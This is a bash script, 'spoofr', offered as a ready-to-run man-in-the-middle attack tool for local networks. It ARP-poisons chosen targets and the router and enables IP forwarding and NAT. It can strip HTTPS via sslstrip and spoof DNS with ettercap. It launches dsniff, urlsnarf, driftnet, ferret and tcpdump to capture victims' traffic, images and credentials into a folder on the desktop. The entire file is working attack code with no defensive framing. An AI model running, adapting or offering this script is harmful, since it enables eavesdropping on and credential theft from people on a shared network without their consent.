#!/bin/bash

## Spoofr Copyright 2013, d4rkcat (thed4rkcat@yandex.com)
#
## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 3 of the License, or
## (at your option) any later version.
#
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License at (http://www.gnu.org/licenses/) for
## more details.

fhelp()																	#Help
{
	clear
	echo """ 
spoofr - ARP poison and sniff with 
	DNS spoofing, urlsnarf, driftnet, ferret, dsniff, sslstrip and tcpdump.
	
	Usage:  spoofr -t <target> -s (break SSL) [in any order]

			-t - Target IP address extension
			-s - Break ssl
			-h - This help
				
	Example: 	spoofr -t 100 -s   			~ Attack $ENET"100" and break SSL
"""
	exit
}

fsetup()
{
	mkdir -p $HOME/Desktop/cap
	mkdir -p $HOME/Desktop/cap/tcpdump
	mkdir -p $HOME/Desktop/cap/driftnet
	mkdir -p $HOME/Desktop/cap/dsniff

	COLOR="tput setab"
	$COLOR 2;echo ' [*] Setting up..';$COLOR 9
	NODENUM=${IPNUM:$CHARPLACE:3}                                       #Numbers after last decimal 
	NICF=$(ifconfig | grep Bcast -B 1)                                  #Connected interface
	NIC=${NICF:0:8}                                           
	AROUTR=$(route -n | grep $NIC)
	NODER=$(($DECPLACE + 3))
	ROUTRF=${AROUTR:16:$NODER}
	ROUTR=${ROUTRF:$DECPLACE:3}
	ROUTR=$(($ROUTR + 1 -1))
	ROUTR=$ENET$ROUTR                                                   #Router ip
	GTERM="gnome-terminal"
	ETTER=$(locate etter.dns)
}

fattack()
{
	if [ $SSLDO -z ] 2> /dev/null
		then
			clear
			$COLOR 4;echo " [>] Do you want to break SSL? [y/N]: ";$COLOR 9
			read -p "  >" DOSSL
		else
			DOSSL=$SSLDO
	fi
	echo 1 > /proc/sys/net/ipv4/ip_forward
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables -P FORWARD ACCEPT
	iptables --table nat --delete-chain
	iptables -t nat -A POSTROUTING -o $NIC -j MASQUERADE
	clear
	$COLOR 2;echo " [*] IP forwarding enabled";$COLOR 9

	case $DOSSL in
		"y")
			iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
			$COLOR 2;echo " [*] SSL broken";$COLOR 9;;
	esac

	arp

	if [ $TARGET -z ] 2>  /dev/null
		then
			$COLOR 4;echo " [>] TARGET IP:";$COLOR 9                                                                 
			echo
			read -p "  >$ENET" TARGET
			TARGET=$ENET$TARGET
			clear
			$COLOR 2;echo " [*] IP forwarding enabled";$COLOR 9
		else
			TARGET=$ENET$TARGET
	fi

	$COLOR 2;echo " [*] Starting dsniff, tcpdump, driftnet, urlsnarf, ferret and spoofing in new windows, let's party..";$COLOR 9
	$COLOR 4;echo " [*] All files will be stored in $HOME/Desktop/cap"

	case $DOSSL in
		"y")
			$GTERM --geometry=10x5+200+600 -x sslstrip -f -k;;
	esac

	DATER=$( date +%Y_%m_%d_%H%M%S )
	$GTERM --geometry=94x20+683+320 -x urlsnarf -i $NIC&
	$GTERM --geometry=97x23+0+320 -x ferret -i $NIC&
	$GTERM --geometry=70x5+700+320 -x driftnet -i $NIC -p -x $DATER-$TARGET -d /root/Desktop/cap/driftnet&
	$GTERM --geometry=94x5+700+570 -x arpspoof -i $NIC -t $TARGET $ROUTR&
	$GTERM --geometry=94x5+700+700 -x arpspoof -i $NIC -t $ROUTR $TARGET&
	$GTERM --geometry=97x5+0+700 -x tcpdump -w /root/Desktop/cap/tcpdump/tcpdump-$DATER-$TARGET.pcap -i $NIC&
	$GTERM --geometry=70x5+0+700 -x dsniff -i $NIC -w /root/Desktop/cap/dsniff/dsniff-$DATER-$TARGET&
	fattack2
}

fattack2()
{
	while [ true ]
		do
			$COLOR 4
			echo " [>] press CTRL+C or ENTER clean up and exit" 
			echo ' [>] press "d" and then ENTER for DNS spoofing';$COLOR 9
			echo
			$COLOR 4;echo " [>] NEXT TARGET IP:"                        #User input needed to attack
			$COLOR 9;echo
			read -p "  >$ENET" TARGET
			case $TARGET in
				"")fexit
				;;
				"d")fdnspoof;;"D")fdnspoof
				;;
				*)
				TARGET=$ENET$TARGET
				echo
				echo
				$COLOR 5;echo " [*] ATTACKING $TARGET [*]";$COLOR 9
				$GTERM --geometry=92x5+700+570 -x arpspoof -i $NIC -t $TARGET $ROUTR&
				$GTERM --geometry=92x5+700+700 -x arpspoof -i $NIC -t $ROUTR $TARGET&
			esac
			clear
		done
	fexit
}

fdnspoof ()
{																		#DNS spoof with ettercap
	$COLOR 4;echo " [*] Do you want to edit etter.dns? [Y/n]:";$COLOR 9
	read -p "  >" EDITDNS
	case $EDITDNS in
		"")vi $ETTER;;
		"y")vi $ETTER;;
		"Y")vi $ETTER
	esac
	clear
	echo
	$COLOR 5;echo " [*] DNS SPOOFING TIME £-P";$COLOR 9
	$COLOR 4;echo " [>] TARGET IP/RANGE:";$COLOR 9
	read -p "  >$ENET" TARGET
	TARGET=$ENET$TARGET
	echo " [*] Press CTRL+C to quit..."
	sleep 0.7
	ettercap -T -q -i $NIC -P dns_spoof -M arp /$ROUTR/ /$TARGET/
	fattack2
}

fexit (){																#Exit
	clear
	echo
	$COLOR 2;echo " [*] All systems are shutting down, Bye!";$COLOR 9                                                                           
	killall dsniff 2> /dev/null&
	killall urlsnarf 2> /dev/null&
	killall arpspoof 2> /dev/null&
	killall driftnet 2> /dev/null&
	killall ferret 2> /dev/null&
	killall sslstrip 2> /dev/null&
	killall tcpdump 2> /dev/null&
	echo 0 > /proc/sys/net/ipv4/ip_forward
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	sleep 1
	service networking restart
	echo
	exit
}

trap fexit 2

IPNUMF=$(ifconfig | grep Bcast)                                 
IPNUM=${IPNUMF:20:14}                                              		#Ip address
																	
DECCOUNT="0"
CHARPLACE="0"
DECPLACE="1"
while [ $DECCOUNT != "3" ]                                          	#Last decimal place
	do                                     
		CHARPLACE=$((CHARPLACE + 1))
		DECPLACE=$((DECPLACE + 1))
		IPCHAR=${IPNUM:$CHARPLACE:1}                                                        
		
		case $IPCHAR in                                                 #Decimal places
			".")
				DECCOUNT=$((DECCOUNT + 1));;
		esac
	done
ENET=${IPNUM:0:$DECPLACE} 
																		#Parse command line arguments
case $1 in "")fhelp;;"-h")fhelp;;"-t")TARGET=$2;;"-s")SSLDO="y";esac
case $2 in "-h")fhelp;;"-t")TARGET=$3;;"-s")SSLDO="y";esac
case $3 in "-h")fhelp;;"-t")TARGET=$4;;"-s")SSLDO="y";esac
case $4 in "-h")fhelp;;"-t")TARGET=$5;;"-s")SSLDO="y";esac

fsetup
fattack
